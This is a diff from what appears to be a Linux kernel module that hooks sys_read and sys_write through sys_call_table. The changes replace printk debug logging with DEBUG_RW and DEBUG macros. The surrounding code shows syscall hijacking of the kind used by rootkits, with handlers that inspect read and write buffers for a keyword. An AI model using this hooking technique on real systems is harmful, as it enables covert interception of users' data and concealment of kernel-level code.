@@ -21,10 +21,10 @@ asmlinkage long n_sys_read ( unsigned int fd, char __user *buf, size_t count )
     if ( memstr((void *)buf, "filter keyword", count) )
     {
         unsigned long i;
-        printk("DEBUG sys_read: fd=%d, count=%zu, buf=\n", fd, count);
+        DEBUG_RW("DEBUG sys_read: fd=%d, count=%zu, buf=\n", fd, count);
         for ( i = 0; i < count; i++ )
-            printk("%x", (unsigned char)buf[i]);
-        printk("\n");
+            DEBUG_RW("%x", (unsigned char)buf[i]);
+        DEBUG_RW("\n");
     }
     #endif
 
@@ -45,10 +45,10 @@ asmlinkage long n_sys_write ( unsigned int fd, const char __user *buf, size_t co
     if ( memstr((void *)buf, "filter keyword", count) )
     {
         unsigned long i;
-        printk("DEBUG sys_write: fd=%d, count=%zu, buf=\n", fd, count);
+        DEBUG_RW("DEBUG sys_write: fd=%d, count=%zu, buf=\n", fd, count);
         for ( i = 0; i < count; i++ )
-            printk("%x", (unsigned char)buf[i]);
-        printk("\n");
+            DEBUG_RW("%x", (unsigned char)buf[i]);
+        DEBUG_RW("\n");
     }
     #endif
 
@@ -63,9 +63,7 @@ asmlinkage long n_sys_write ( unsigned int fd, const char __user *buf, size_t co
 
 void hookrw_init ( void )
 {
-    #if __DEBUG__
-    printk("Hooking sys_read and sys_write\n");
-    #endif
+    DEBUG("Hooking sys_read and sys_write\n");
 
     sys_read = (void *)sys_call_table[__NR_read];
     hijack_start(sys_read, &n_sys_read);
@@ -76,9 +74,7 @@ void hookrw_init ( void )
 
 void hookrw_exit ( void )
 {
-    #if __DEBUG__
-    printk("Unhooking sys_read and sys_write\n");
-    #endif
+    DEBUG("Unhooking sys_read and sys_write\n");
 
     hijack_stop(sys_read);
     hijack_stop(sys_write);
